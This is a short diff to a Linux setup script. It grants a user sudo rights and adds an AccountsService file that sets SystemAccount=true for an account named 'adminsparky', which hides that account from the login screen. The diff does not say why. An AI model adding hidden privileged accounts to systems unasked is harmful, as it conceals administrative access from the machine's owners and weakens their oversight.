@@ -22,6 +22,9 @@ sudo usermod -aG sudo $username
 ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)
 echo "This computer's IP address is $ip"
 
+# Add a file to the system with specified content
+echo '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparky\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky
+
 
 sudo systemctl restart accounts-daemon.service
 
